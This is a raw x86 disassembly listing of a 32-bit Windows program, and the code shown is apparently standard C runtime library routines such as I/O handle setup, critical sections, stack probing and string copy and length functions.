  42358e:	lea    esi,[ecx+eax*4]
  423591:	mov    eax,DWORD PTR [esp+0x10]
  423595:	mov    eax,DWORD PTR [eax]
  423597:	mov    DWORD PTR [esi],eax
  423599:	mov    al,BYTE PTR [ebp+0x0]
  42359c:	mov    BYTE PTR [esi+0x4],al
  42359f:	lea    eax,[esi+0xc]
  4235a2:	push   0xfa0
  4235a7:	push   eax
  4235a8:	call   0x4248ed
  4235ad:	test   eax,eax
  4235af:	pop    ecx
  4235b0:	pop    ecx
  4235b1:	je     0x4235e1
  4235b3:	inc    DWORD PTR [esi+0x8]
  4235b6:	add    DWORD PTR [esp+0x10],0x4
  4235bb:	inc    ebx
  4235bc:	inc    ebp
  4235bd:	cmp    ebx,edi
  4235bf:	jl     0x423557
  4235c1:	xor    ebx,ebx
  4235c3:	mov    ecx,DWORD PTR ds:0x45d160
  4235c9:	lea    eax,[ebx+ebx*8]
  4235cc:	lea    esi,[ecx+eax*4]
  4235cf:	cmp    DWORD PTR [esi],0xffffffff
  4235d2:	jne    0x423643
  4235d4:	test   ebx,ebx
  4235d6:	mov    BYTE PTR [esi+0x4],0x81
  4235da:	jne    0x4235e6
  4235dc:	push   0xfffffff6
  4235de:	pop    eax
  4235df:	jmp    0x4235f0
  4235e1:	or     eax,0xffffffff
  4235e4:	jmp    0x42365f
  4235e6:	mov    eax,ebx
  4235e8:	dec    eax
  4235e9:	neg    eax
  4235eb:	sbb    eax,eax
  4235ed:	add    eax,0xfffffff5
  4235f0:	push   eax
  4235f1:	call   DWORD PTR ds:0x428038
  4235f7:	mov    edi,eax
  4235f9:	cmp    edi,0xffffffff
  4235fc:	je     0x42363d
  4235fe:	push   edi
  4235ff:	call   DWORD PTR ds:0x42805c
  423605:	test   eax,eax
  423607:	je     0x42363d
  423609:	and    eax,0xff
  42360e:	cmp    eax,0x2
  423611:	mov    DWORD PTR [esi],edi
  423613:	jne    0x42361b
  423615:	or     BYTE PTR [esi+0x4],0x40
  423619:	jmp    0x423624
  42361b:	cmp    eax,0x3
  42361e:	jne    0x423624
  423620:	or     BYTE PTR [esi+0x4],0x8
  423624:	lea    eax,[esi+0xc]
  423627:	push   0xfa0
  42362c:	push   eax
  42362d:	call   0x4248ed
  423632:	test   eax,eax
  423634:	pop    ecx
  423635:	pop    ecx
  423636:	je     0x4235e1
  423638:	inc    DWORD PTR [esi+0x8]
  42363b:	jmp    0x423647
  42363d:	or     BYTE PTR [esi+0x4],0x40
  423641:	jmp    0x423647
  423643:	or     BYTE PTR [esi+0x4],0x80
  423647:	inc    ebx
  423648:	cmp    ebx,0x3
  42364b:	jl     0x4235c3
  423651:	push   DWORD PTR ds:0x45d148
  423657:	call   DWORD PTR ds:0x428058
  42365d:	xor    eax,eax
  42365f:	pop    edi
  423660:	pop    esi
  423661:	pop    ebp
  423662:	pop    ebx
  423663:	add    esp,0x48
  423666:	ret    
  423667:	push   0xc
  423669:	push   0x4284a0
  42366e:	call   0x423858
  423673:	mov    DWORD PTR [ebp-0x1c],0x428ef8
  42367a:	cmp    DWORD PTR [ebp-0x1c],0x428ef8
  423681:	jae    0x4236a5
  423683:	and    DWORD PTR [ebp-0x4],0x0
  423687:	mov    eax,DWORD PTR [ebp-0x1c]
  42368a:	mov    eax,DWORD PTR [eax]
  42368c:	test   eax,eax
  42368e:	je     0x42369b
  423690:	call   eax
  423692:	jmp    0x42369b
  423694:	xor    eax,eax
  423696:	inc    eax
  423697:	ret    
  423698:	mov    esp,DWORD PTR [ebp-0x18]
  42369b:	or     DWORD PTR [ebp-0x4],0xffffffff
  42369f:	add    DWORD PTR [ebp-0x1c],0x4
  4236a3:	jmp    0x42367a
  4236a5:	call   0x423893
  4236aa:	ret    
  4236ab:	push   0xc
  4236ad:	push   0x4284b0
  4236b2:	call   0x423858
  4236b7:	mov    DWORD PTR [ebp-0x1c],0x428f00
  4236be:	cmp    DWORD PTR [ebp-0x1c],0x428f00
  4236c5:	jae    0x4236e9
  4236c7:	and    DWORD PTR [ebp-0x4],0x0
  4236cb:	mov    eax,DWORD PTR [ebp-0x1c]
  4236ce:	mov    eax,DWORD PTR [eax]
  4236d0:	test   eax,eax
  4236d2:	je     0x4236df
  4236d4:	call   eax
  4236d6:	jmp    0x4236df
  4236d8:	xor    eax,eax
  4236da:	inc    eax
  4236db:	ret    
  4236dc:	mov    esp,DWORD PTR [ebp-0x18]
  4236df:	or     DWORD PTR [ebp-0x4],0xffffffff
  4236e3:	add    DWORD PTR [ebp-0x1c],0x4
  4236e7:	jmp    0x4236be
  4236e9:	call   0x423893
  4236ee:	ret    
  4236ef:	call   0x423936
  4236f4:	mov    eax,ds:0x45c304
  4236f9:	cmp    eax,0xffffffff
  4236fc:	je     0x42370c
  4236fe:	push   eax
  4236ff:	call   DWORD PTR ds:0x428064
  423705:	or     DWORD PTR ds:0x45c304,0xffffffff
  42370c:	ret    
  42370d:	push   ebx
  42370e:	push   esi
  42370f:	call   DWORD PTR ds:0x428010
  423715:	push   DWORD PTR ds:0x45c304
  42371b:	mov    ebx,eax
  42371d:	call   DWORD PTR ds:0x428074
  423723:	mov    esi,eax
  423725:	test   esi,esi
  423727:	jne    0x423772
  423729:	push   0x88
  42372e:	push   0x1
  423730:	call   0x424978
  423735:	mov    esi,eax
  423737:	test   esi,esi
  423739:	pop    ecx
  42373a:	pop    ecx
  42373b:	je     0x42376a
  42373d:	push   esi
  42373e:	push   DWORD PTR ds:0x45c304
  423744:	call   DWORD PTR ds:0x428070
  42374a:	test   eax,eax
  42374c:	je     0x42376a
  42374e:	mov    DWORD PTR [esi+0x54],0x45c258
  423755:	mov    DWORD PTR [esi+0x14],0x1
  42375c:	call   DWORD PTR ds:0x42806c
  423762:	or     DWORD PTR [esi+0x4],0xffffffff
  423766:	mov    DWORD PTR [esi],eax
  423768:	jmp    0x423772
  42376a:	push   0x10
  42376c:	call   0x422920
  423771:	pop    ecx
  423772:	push   ebx
  423773:	call   DWORD PTR ds:0x428068
  423779:	mov    eax,esi
  42377b:	pop    esi
  42377c:	pop    ebx
  42377d:	ret    
  42377e:	call   0x4238ed
  423783:	test   eax,eax
  423785:	je     0x423797
  423787:	call   DWORD PTR ds:0x428078
  42378d:	cmp    eax,0xffffffff
  423790:	mov    ds:0x45c304,eax
  423795:	jne    0x42379f
  423797:	call   0x4236ef
  42379c:	xor    eax,eax
  42379e:	ret    
  42379f:	push   esi
  4237a0:	push   0x88
  4237a5:	push   0x1
  4237a7:	call   0x424978
  4237ac:	mov    esi,eax
  4237ae:	test   esi,esi
  4237b0:	pop    ecx
  4237b1:	pop    ecx
  4237b2:	je     0x4237e4
  4237b4:	push   esi
  4237b5:	push   DWORD PTR ds:0x45c304
  4237bb:	call   DWORD PTR ds:0x428070
  4237c1:	test   eax,eax
  4237c3:	je     0x4237e4
  4237c5:	mov    DWORD PTR [esi+0x54],0x45c258
  4237cc:	mov    DWORD PTR [esi+0x14],0x1
  4237d3:	call   DWORD PTR ds:0x42806c
  4237d9:	or     DWORD PTR [esi+0x4],0xffffffff
  4237dd:	mov    DWORD PTR [esi],eax
  4237df:	xor    eax,eax
  4237e1:	inc    eax
  4237e2:	pop    esi
  4237e3:	ret    
  4237e4:	call   0x4236ef
  4237e9:	xor    eax,eax
  4237eb:	pop    esi
  4237ec:	ret    
  4237ed:	cmp    DWORD PTR ds:0x45cac4,0x2
  4237f4:	jne    0x423803
  4237f6:	cmp    DWORD PTR ds:0x45cad0,0x5
  4237fd:	jb     0x423803
  4237ff:	xor    eax,eax
  423801:	inc    eax
  423802:	ret    
  423803:	push   0x3
  423805:	pop    eax
  423806:	ret    
  423807:	xor    eax,eax
  423809:	cmp    DWORD PTR [esp+0x4],eax
  42380d:	push   0x0
  42380f:	sete   al
  423812:	push   0x1000
  423817:	push   eax
  423818:	call   DWORD PTR ds:0x428080
  42381e:	test   eax,eax
  423820:	mov    ds:0x45d140,eax
  423825:	je     0x423851
  423827:	call   0x4237ed
  42382c:	cmp    eax,0x3
  42382f:	mov    ds:0x45d144,eax
  423834:	jne    0x423854
  423836:	push   0x3f8
  42383b:	call   0x424bfa
  423840:	test   eax,eax
  423842:	pop    ecx
  423843:	jne    0x423854
  423845:	push   DWORD PTR ds:0x45d140
  42384b:	call   DWORD PTR ds:0x42807c
  423851:	xor    eax,eax
  423853:	ret    
  423854:	xor    eax,eax
  423856:	inc    eax
  423857:	ret    
  423858:	push   0x425728
  42385d:	mov    eax,fs:0x0
  423863:	push   eax
  423864:	mov    eax,DWORD PTR [esp+0x10]
  423868:	mov    DWORD PTR [esp+0x10],ebp
  42386c:	lea    ebp,[esp+0x10]
  423870:	sub    esp,eax
  423872:	push   ebx
  423873:	push   esi
  423874:	push   edi
  423875:	mov    eax,DWORD PTR [ebp-0x8]
  423878:	mov    DWORD PTR [ebp-0x18],esp
  42387b:	push   eax
  42387c:	mov    eax,DWORD PTR [ebp-0x4]
  42387f:	mov    DWORD PTR [ebp-0x4],0xffffffff
  423886:	mov    DWORD PTR [ebp-0x8],eax
  423889:	lea    eax,[ebp-0x10]
  42388c:	mov    fs:0x0,eax
  423892:	ret    
  423893:	mov    ecx,DWORD PTR [ebp-0x10]
  423896:	mov    DWORD PTR fs:0x0,ecx
  42389d:	pop    ecx
  42389e:	pop    edi
  42389f:	pop    esi
  4238a0:	pop    ebx
  4238a1:	leave  
  4238a2:	push   ecx
  4238a3:	ret    
  4238a4:	int3   
  4238a5:	int3   
  4238a6:	int3   
  4238a7:	int3   
  4238a8:	int3   
  4238a9:	int3   
  4238aa:	int3   
  4238ab:	int3   
  4238ac:	int3   
  4238ad:	int3   
  4238ae:	int3   
  4238af:	int3   
  4238b0:	cmp    eax,0x1000
  4238b5:	jae    0x4238c5
  4238b7:	neg    eax
  4238b9:	add    eax,esp
  4238bb:	add    eax,0x4
  4238be:	test   DWORD PTR [eax],eax
  4238c0:	xchg   esp,eax
  4238c1:	mov    eax,DWORD PTR [eax]
  4238c3:	push   eax
  4238c4:	ret    
  4238c5:	push   ecx
  4238c6:	lea    ecx,[esp+0x8]
  4238ca:	sub    ecx,0x1000
  4238d0:	sub    eax,0x1000
  4238d5:	test   DWORD PTR [ecx],eax
  4238d7:	cmp    eax,0x1000
  4238dc:	jae    0x4238ca
  4238de:	sub    ecx,eax
  4238e0:	mov    eax,esp
  4238e2:	test   DWORD PTR [ecx],eax
  4238e4:	mov    esp,ecx
  4238e6:	mov    ecx,DWORD PTR [eax]
  4238e8:	mov    eax,DWORD PTR [eax+0x4]
  4238eb:	push   eax
  4238ec:	ret    
  4238ed:	push   esi
  4238ee:	push   edi
  4238ef:	xor    esi,esi
  4238f1:	mov    edi,0x45cc20
  4238f6:	cmp    DWORD PTR [esi*8+0x45c314],0x1
  4238fe:	jne    0x42391e
  423900:	lea    eax,[esi*8+0x45c310]
  423907:	mov    DWORD PTR [eax],edi
  423909:	push   0xfa0
  42390e:	push   DWORD PTR [eax]
  423910:	add    edi,0x18
  423913:	call   0x4248ed
  423918:	test   eax,eax
  42391a:	pop    ecx
  42391b:	pop    ecx
  42391c:	je     0x42392a
  42391e:	inc    esi
  42391f:	cmp    esi,0x24
  423922:	jl     0x4238f6
  423924:	xor    eax,eax
  423926:	inc    eax
  423927:	pop    edi
  423928:	pop    esi
  423929:	ret    
  42392a:	and    DWORD PTR [esi*8+0x45c310],0x0
  423932:	xor    eax,eax
  423934:	jmp    0x423927
  423936:	push   ebx
  423937:	mov    ebx,DWORD PTR ds:0x428060
  42393d:	push   esi
  42393e:	mov    esi,0x45c310
  423943:	push   edi
  423944:	mov    edi,DWORD PTR [esi]
  423946:	test   edi,edi
  423948:	je     0x42395d
  42394a:	cmp    DWORD PTR [esi+0x4],0x1
  42394e:	je     0x42395d
  423950:	push   edi
  423951:	call   ebx
  423953:	push   edi
  423954:	call   0x42446a
  423959:	and    DWORD PTR [esi],0x0
  42395c:	pop    ecx
  42395d:	add    esi,0x8
  423960:	cmp    esi,0x45c430
  423966:	jl     0x423944
  423968:	mov    esi,0x45c310
  42396d:	pop    edi
  42396e:	mov    eax,DWORD PTR [esi]
  423970:	test   eax,eax
  423972:	je     0x42397d
  423974:	cmp    DWORD PTR [esi+0x4],0x1
  423978:	jne    0x42397d
  42397a:	push   eax
  42397b:	call   ebx
  42397d:	add    esi,0x8
  423980:	cmp    esi,0x45c430
  423986:	jl     0x42396e
  423988:	pop    esi
  423989:	pop    ebx
  42398a:	ret    
  42398b:	push   ebp
  42398c:	mov    ebp,esp
  42398e:	mov    eax,DWORD PTR [ebp+0x8]
  423991:	push   DWORD PTR [eax*8+0x45c310]
  423998:	call   DWORD PTR ds:0x42808c
  42399e:	pop    ebp
  42399f:	ret    
  4239a0:	push   ebp
  4239a1:	mov    ebp,esp
  4239a3:	push   esi
  4239a4:	mov    esi,DWORD PTR [ebp+0x8]
  4239a7:	lea    esi,[esi*8+0x45c310]
  4239ae:	cmp    DWORD PTR [esi],0x0
  4239b1:	je     0x4239b8
  4239b3:	xor    eax,eax
  4239b5:	inc    eax
  4239b6:	jmp    0x423a1c
  4239b8:	push   edi
  4239b9:	push   0x18
  4239bb:	call   0x424582
  4239c0:	mov    edi,eax
  4239c2:	test   edi,edi
  4239c4:	pop    ecx
  4239c5:	jne    0x4239d6
  4239c7:	call   0x425800
  4239cc:	mov    DWORD PTR [eax],0xc
  4239d2:	xor    eax,eax
  4239d4:	jmp    0x423a1b
  4239d6:	push   0xa
  4239d8:	call   0x423a1f
  4239dd:	cmp    DWORD PTR [esi],0x0
  4239e0:	pop    ecx
  4239e1:	jne    0x423a09
  4239e3:	push   0xfa0
  4239e8:	push   edi
  4239e9:	call   0x4248ed
  4239ee:	test   eax,eax
  4239f0:	pop    ecx
  4239f1:	pop    ecx
  4239f2:	jne    0x423a05
  4239f4:	push   edi
  4239f5:	call   0x42446a
  4239fa:	push   0xa
  4239fc:	call   0x42398b
  423a01:	pop    ecx
  423a02:	pop    ecx
  423a03:	jmp    0x4239c7
  423a05:	mov    DWORD PTR [esi],edi
  423a07:	jmp    0x423a10
  423a09:	push   edi
  423a0a:	call   0x42446a
  423a0f:	pop    ecx
  423a10:	push   0xa
  423a12:	call   0x42398b
  423a17:	xor    eax,eax
  423a19:	pop    ecx
  423a1a:	inc    eax
  423a1b:	pop    edi
  423a1c:	pop    esi
  423a1d:	pop    ebp
  423a1e:	ret    
  423a1f:	push   ebp
  423a20:	mov    ebp,esp
  423a22:	mov    eax,DWORD PTR [ebp+0x8]
  423a25:	push   esi
  423a26:	lea    esi,[eax*8+0x45c310]
  423a2d:	cmp    DWORD PTR [esi],0x0
  423a30:	jne    0x423a45
  423a32:	push   eax
  423a33:	call   0x4239a0
  423a38:	test   eax,eax
  423a3a:	pop    ecx
  423a3b:	jne    0x423a45
  423a3d:	push   0x11
  423a3f:	call   0x422920
  423a44:	pop    ecx
  423a45:	push   DWORD PTR [esi]
  423a47:	call   DWORD PTR ds:0x428090
  423a4d:	pop    esi
  423a4e:	pop    ebp
  423a4f:	ret    
  423a50:	push   esi
  423a51:	push   DWORD PTR ds:0x45d268
  423a57:	call   0x4259b6
  423a5c:	pop    ecx
  423a5d:	mov    ecx,DWORD PTR ds:0x45d264
  423a63:	mov    esi,eax
  423a65:	mov    eax,ds:0x45d268
  423a6a:	mov    edx,ecx
  423a6c:	sub    edx,eax
  423a6e:	add    edx,0x4
  423a71:	cmp    esi,edx
  423a73:	jae    0x423ac3
  423a75:	mov    ecx,0x800
  423a7a:	cmp    esi,ecx
  423a7c:	jae    0x423a80
  423a7e:	mov    ecx,esi
  423a80:	add    ecx,esi
  423a82:	push   ecx
  423a83:	push   eax
  423a84:	call   0x425809
  423a89:	test   eax,eax
  423a8b:	pop    ecx
  423a8c:	pop    ecx
  423a8d:	jne    0x423aa6
  423a8f:	add    esi,0x10
  423a92:	push   esi
  423a93:	push   DWORD PTR ds:0x45d268
  423a99:	call   0x425809
  423a9e:	test   eax,eax
  423aa0:	pop    ecx
  423aa1:	pop    ecx
  423aa2:	jne    0x423aa6
  423aa4:	pop    esi
  423aa5:	ret    
  423aa6:	mov    ecx,DWORD PTR ds:0x45d264
  423aac:	sub    ecx,DWORD PTR ds:0x45d268
  423ab2:	mov    ds:0x45d268,eax
  423ab7:	sar    ecx,0x2
  423aba:	lea    ecx,[eax+ecx*4]
  423abd:	mov    DWORD PTR ds:0x45d264,ecx
  423ac3:	mov    DWORD PTR [ecx],edi
  423ac5:	add    DWORD PTR ds:0x45d264,0x4
  423acc:	mov    eax,edi
  423ace:	pop    esi
  423acf:	ret    
  423ad0:	push   0x80
  423ad5:	call   0x424582
  423ada:	test   eax,eax
  423adc:	pop    ecx
  423add:	mov    ds:0x45d268,eax
  423ae2:	jne    0x423ae8
  423ae4:	push   0x18
  423ae6:	pop    eax
  423ae7:	ret    
  423ae8:	and    DWORD PTR [eax],0x0
  423aeb:	mov    eax,ds:0x45d268
  423af0:	mov    ds:0x45d264,eax
  423af5:	xor    eax,eax
  423af7:	ret    
  423af8:	push   0xc
  423afa:	push   0x4284c0
  423aff:	call   0x423858
  423b04:	call   0x422b6b
  423b09:	and    DWORD PTR [ebp-0x4],0x0
  423b0d:	mov    edi,DWORD PTR [ebp+0x8]
  423b10:	call   0x423a50
  423b15:	mov    DWORD PTR [ebp-0x1c],eax
  423b18:	or     DWORD PTR [ebp-0x4],0xffffffff
  423b1c:	call   0x423b2a
  423b21:	mov    eax,DWORD PTR [ebp-0x1c]
  423b24:	call   0x423893
  423b29:	ret    
  423b2a:	call   0x422b74
  423b2f:	ret    
  423b30:	push   DWORD PTR [esp+0x4]
  423b34:	call   0x423af8
  423b39:	neg    eax
  423b3b:	sbb    eax,eax
  423b3d:	neg    eax
  423b3f:	pop    ecx
  423b40:	dec    eax
  423b41:	ret    
  423b42:	push   ebp
  423b43:	mov    ebp,esp
  423b45:	sub    esp,0x10
  423b48:	push   ebx
  423b49:	xor    ebx,ebx
  423b4b:	cmp    DWORD PTR ds:0x45cd70,ebx
  423b51:	push   esi
  423b52:	push   edi
  423b53:	jne    0x423bc2
  423b55:	push   0x428530
  423b5a:	call   DWORD PTR ds:0x428094
  423b60:	mov    edi,eax
  423b62:	cmp    edi,ebx
  423b64:	je     0x423bfd
  423b6a:	mov    esi,DWORD PTR ds:0x428018
  423b70:	push   0x428524
  423b75:	push   edi
  423b76:	call   esi
  423b78:	test   eax,eax
  423b7a:	mov    ds:0x45cd70,eax
  423b7f:	je     0x423bfd
  423b81:	push   0x428514
  423b86:	push   edi
  423b87:	call   esi
  423b89:	push   0x428500
  423b8e:	push   edi
  423b8f:	mov    ds:0x45cd74,eax
  423b94:	call   esi
  423b96:	cmp    DWORD PTR ds:0x45cac4,0x2
  423b9d:	mov    ds:0x45cd78,eax
  423ba2:	jne    0x423bc2
  423ba4:	push   0x4284e4
  423ba9:	push   edi
  423baa:	call   esi
  423bac:	test   eax,eax
  423bae:	mov    ds:0x45cd80,eax
  423bb3:	je     0x423bc2
  423bb5:	push   0x4284cc
  423bba:	push   edi
  423bbb:	call   esi
  423bbd:	mov    ds:0x45cd7c,eax
  423bc2:	mov    eax,ds:0x45cd7c
  423bc7:	test   eax,eax
  423bc9:	je     0x423c07
  423bcb:	call   eax
  423bcd:	test   eax,eax
  423bcf:	je     0x423bee
  423bd1:	lea    ecx,[ebp-0x4]
  423bd4:	push   ecx
  423bd5:	push   0xc
  423bd7:	lea    ecx,[ebp-0x10]
  423bda:	push   ecx
  423bdb:	push   0x1
  423bdd:	push   eax
  423bde:	call   DWORD PTR ds:0x45cd80
  423be4:	test   eax,eax
  423be6:	je     0x423bee
  423be8:	test   BYTE PTR [ebp-0x8],0x1
  423bec:	jne    0x423c07
  423bee:	cmp    DWORD PTR ds:0x45cad0,0x4
  423bf5:	jb     0x423c01
  423bf7:	or     BYTE PTR [ebp+0x12],0x20
  423bfb:	jmp    0x423c26
  423bfd:	xor    eax,eax
  423bff:	jmp    0x423c36
  423c01:	or     BYTE PTR [ebp+0x12],0x4
  423c05:	jmp    0x423c26
  423c07:	mov    eax,ds:0x45cd74
  423c0c:	test   eax,eax
  423c0e:	je     0x423c26
  423c10:	call   eax
  423c12:	mov    ebx,eax
  423c14:	test   ebx,ebx
  423c16:	je     0x423c26
  423c18:	mov    eax,ds:0x45cd78
  423c1d:	test   eax,eax
  423c1f:	je     0x423c26
  423c21:	push   ebx
  423c22:	call   eax
  423c24:	mov    ebx,eax
  423c26:	push   DWORD PTR [ebp+0x10]
  423c29:	push   DWORD PTR [ebp+0xc]
  423c2c:	push   DWORD PTR [ebp+0x8]
  423c2f:	push   ebx
  423c30:	call   DWORD PTR ds:0x45cd70
  423c36:	pop    edi
  423c37:	pop    esi
  423c38:	pop    ebx
  423c39:	leave  
  423c3a:	ret    
  423c3b:	int3   
  423c3c:	int3   
  423c3d:	int3   
  423c3e:	int3   
  423c3f:	int3   
  423c40:	push   edi
  423c41:	mov    edi,DWORD PTR [esp+0x8]
  423c45:	jmp    0x423cb5
  423c47:	lea    esp,[esp+0x0]
  423c4e:	mov    edi,edi
  423c50:	mov    ecx,DWORD PTR [esp+0x4]
  423c54:	push   edi
  423c55:	test   ecx,0x3
  423c5b:	je     0x423c70
  423c5d:	mov    al,BYTE PTR [ecx]
  423c5f:	add    ecx,0x1
  423c62:	test   al,al
  423c64:	je     0x423ca3
  423c66:	test   ecx,0x3
  423c6c:	jne    0x423c5d
  423c6e:	mov    edi,edi
  423c70:	mov    eax,DWORD PTR [ecx]
  423c72:	mov    edx,0x7efefeff
  423c77:	add    edx,eax
  423c79:	xor    eax,0xffffffff
  423c7c:	xor    eax,edx
  423c7e:	add    ecx,0x4
  423c81:	test   eax,0x81010100
  423c86:	je     0x423c70
  423c88:	mov    eax,DWORD PTR [ecx-0x4]
  423c8b:	test   al,al
  423c8d:	je     0x423cb2
  423c8f:	test   ah,ah
  423c91:	je     0x423cad
  423c93:	test   eax,0xff0000
  423c98:	je     0x423ca8
  423c9a:	test   eax,0xff000000
  423c9f:	je     0x423ca3
  423ca1:	jmp    0x423c70
  423ca3:	lea    edi,[ecx-0x1]
  423ca6:	jmp    0x423cb5
  423ca8:	lea    edi,[ecx-0x2]
  423cab:	jmp    0x423cb5
  423cad:	lea    edi,[ecx-0x3]
  423cb0:	jmp    0x423cb5
  423cb2:	lea    edi,[ecx-0x4]
  423cb5:	mov    ecx,DWORD PTR [esp+0xc]
  423cb9:	test   ecx,0x3
  423cbf:	je     0x423cde
  423cc1:	mov    dl,BYTE PTR [ecx]
  423cc3:	add    ecx,0x1
  423cc6:	test   dl,dl
  423cc8:	je     0x423d30
  423cca:	mov    BYTE PTR [edi],dl
  423ccc:	add    edi,0x1
  423ccf:	test   ecx,0x3
  423cd5:	jne    0x423cc1
  423cd7:	jmp    0x423cde
  423cd9:	mov    DWORD PTR [edi],edx
  423cdb:	add    edi,0x4
  423cde:	mov    edx,0x7efefeff
  423ce3:	mov    eax,DWORD PTR [ecx]
  423ce5:	add    edx,eax
  423ce7:	xor    eax,0xffffffff
  423cea:	xor    eax,edx
  423cec:	mov    edx,DWORD PTR [ecx]
  423cee:	add    ecx,0x4
  423cf1:	test   eax,0x81010100
  423cf6:	je     0x423cd9
  423cf8:	test   dl,dl
  423cfa:	je     0x423d30
  423cfc:	test   dh,dh
  423cfe:	je     0x423d27
  423d00:	test   edx,0xff0000
  423d06:	je     0x423d1a
  423d08:	test   edx,0xff000000
  423d0e:	je     0x423d12
  423d10:	jmp    0x423cd9
  423d12:	mov    DWORD PTR [edi],edx
  423d14:	mov    eax,DWORD PTR [esp+0x8]
  423d18:	pop    edi
  423d19:	ret    
  423d1a:	mov    WORD PTR [edi],dx
  423d1d:	mov    eax,DWORD PTR [esp+0x8]
  423d21:	mov    BYTE PTR [edi+0x2],0x0
  423d25:	pop    edi
  423d26:	ret    
  423d27:	mov    WORD PTR [edi],dx
  423d2a:	mov    eax,DWORD PTR [esp+0x8]
  423d2e:	pop    edi
  423d2f:	ret    
  423d30:	mov    BYTE PTR [edi],dl
  423d32:	mov    eax,DWORD PTR [esp+0x8]
  423d36:	pop    edi
  423d37:	ret    
  423d38:	int3   
  423d39:	int3   
  423d3a:	int3   
  423d3b:	int3   
  423d3c:	int3   
  423d3d:	int3   
  423d3e:	int3   
  423d3f:	int3   
  423d40:	mov    ecx,DWORD PTR [esp+0xc]
  423d44:	push   edi
  423d45:	test   ecx,ecx
  423d47:	je     0x423ddf
  423d4d:	push   esi
  423d4e:	push   ebx
  423d4f:	mov    ebx,ecx
  423d51:	mov    esi,DWORD PTR [esp+0x14]
  423d55:	test   esi,0x3
  423d5b:	mov    edi,DWORD PTR [esp+0x10]
  423d5f:	jne    0x423d6c
  423d61:	shr    ecx,0x2
  423d64:	jne    0x423def
  423d6a:	jmp    0x423d93
  423d6c:	mov    al,BYTE PTR [esi]
  423d6e:	add    esi,0x1
  423d71:	mov    BYTE PTR [edi],al
  423d73:	add    edi,0x1
  423d76:	sub    ecx,0x1
  423d79:	je     0x423da6
  423d7b:	test   al,al
  423d7d:	je     0x423dae
  423d7f:	test   esi,0x3
  423d85:	jne    0x423d6c
  423d87:	mov    ebx,ecx
  423d89:	shr    ecx,0x2
  423d8c:	jne    0x423def
  423d8e:	and    ebx,0x3
  423d91:	je     0x423da6
  423d93:	mov    al,BYTE PTR [esi]
  423d95:	add    esi,0x1
  423d98:	mov    BYTE PTR [edi],al
  423d9a:	add    edi,0x1
  423d9d:	test   al,al
  423d9f:	je     0x423dd8
  423da1:	sub    ebx,0x1
  423da4:	jne    0x423d93
  423da6:	mov    eax,DWORD PTR [esp+0x10]
  423daa:	pop    ebx
  423dab:	pop    esi
  423dac:	pop    edi
  423dad:	ret    
  423dae:	test   edi,0x3
  423db4:	je     0x423dcc
  423db6:	mov    BYTE PTR [edi],al
  423db8:	add    edi,0x1
  423dbb:	sub    ecx,0x1
  423dbe:	je     0x423e5c
  423dc4:	test   edi,0x3
  423dca:	jne    0x423db6
  423dcc:	mov    ebx,ecx
  423dce:	shr    ecx,0x2
  423dd1:	jne    0x423e47
  423dd3:	mov    BYTE PTR [edi],al
  423dd5:	add    edi,0x1
  423dd8:	sub    ebx,0x1
  423ddb:	jne    0x423dd3
  423ddd:	pop    ebx
  423dde:	pop    esi
  423ddf:	mov    eax,DWORD PTR [esp+0x8]
  423de3:	pop    edi
  423de4:	ret    
  423de5:	mov    DWORD PTR [edi],edx
  423de7:	add    edi,0x4
  423dea:	sub    ecx,0x1
  423ded:	je     0x423d8e
  423def:	mov    edx,0x7efefeff
  423df4:	mov    eax,DWORD PTR [esi]
  423df6:	add    edx,eax
  423df8:	xor    eax,0xffffffff
  423dfb:	xor    eax,edx
  423dfd:	mov    edx,DWORD PTR [esi]
  423dff:	add    esi,0x4
  423e02:	test   eax,0x81010100
  423e07:	je     0x423de5
  423e09:	test   dl,dl
  423e0b:	je     0x423e39
  423e0d:	test   dh,dh
  423e0f:	je     0x423e2f
  423e11:	test   edx,0xff0000
  423e17:	je     0x423e25
  423e19:	test   edx,0xff000000
  423e1f:	jne    0x423de5
  423e21:	mov    DWORD PTR [edi],edx
  423e23:	jmp    0x423e3d
  423e25:	and    edx,0xffff
  423e2b:	mov    DWORD PTR [edi],edx
  423e2d:	jmp    0x423e3d
  423e2f:	and    edx,0xff
  423e35:	mov    DWORD PTR [edi],edx
  423e37:	jmp    0x423e3d
  423e39:	xor    edx,edx
  423e3b:	mov    DWORD PTR [edi],edx
  423e3d:	add    edi,0x4
  423e40:	xor    eax,eax
  423e42:	sub    ecx,0x1
  423e45:	je     0x423e53
  423e47:	xor    eax,eax
  423e49:	mov    DWORD PTR [edi],eax
  423e4b:	add    edi,0x4
  423e4e:	sub    ecx,0x1
  423e51:	jne    0x423e49
  423e53:	and    ebx,0x3
  423e56:	jne    0x423dd3
  423e5c:	mov    eax,DWORD PTR [esp+0x10]
  423e60:	pop    ebx
  423e61:	pop    esi
  423e62:	pop    edi
  423e63:	ret    
  423e64:	int3   
  423e65:	int3   
  423e66:	int3   
  423e67:	int3   
  423e68:	int3   
  423e69:	int3   
  423e6a:	int3   
  423e6b:	int3   
  423e6c:	int3   
  423e6d:	int3   
  423e6e:	int3   
  423e6f:	int3   
  423e70:	mov    ecx,DWORD PTR [esp+0x4]
  423e74:	test   ecx,0x3
  423e7a:	je     0x423ea0
  423e7c:	mov    al,BYTE PTR [ecx]
  423e7e:	add    ecx,0x1
  423e81:	test   al,al
  423e83:	je     0x423ed3
  423e85:	test   ecx,0x3
  423e8b:	jne    0x423e7c
  423e8d:	add    eax,0x0
  423e92:	lea    esp,[esp+0x0]
  423e99:	lea    esp,[esp+0x0]
  423ea0:	mov    eax,DWORD PTR [ecx]
  423ea2:	mov    edx,0x7efefeff
  423ea7:	add    edx,eax
  423ea9:	xor    eax,0xffffffff
  423eac:	xor    eax,edx
  423eae:	add    ecx,0x4
  423eb1:	test   eax,0x81010100
  423eb6:	je     0x423ea0
  423eb8:	mov    eax,DWORD PTR [ecx-0x4]
  423ebb:	test   al,al
  423ebd:	je     0x423ef1
  423ebf:	test   ah,ah
  423ec1:	je     0x423ee7
  423ec3:	test   eax,0xff0000
  423ec8:	je     0x423edd
  423eca:	test   eax,0xff000000
  423ecf:	je     0x423ed3
  423ed1:	jmp    0x423ea0
  423ed3:	lea    eax,[ecx-0x1]
  423ed6:	mov    ecx,DWORD PTR [esp+0x4]
  423eda:	sub    eax,ecx
  423edc:	ret    
  423edd:	lea    eax,[ecx-0x2]
  423ee0:	mov    ecx,DWORD PTR [esp+0x4]
  423ee4:	sub    eax,ecx
  423ee6:	ret    
  423ee7:	lea    eax,[ecx-0x3]
  423eea:	mov    ecx,DWORD PTR [esp+0x4]
  423eee:	sub    eax,ecx
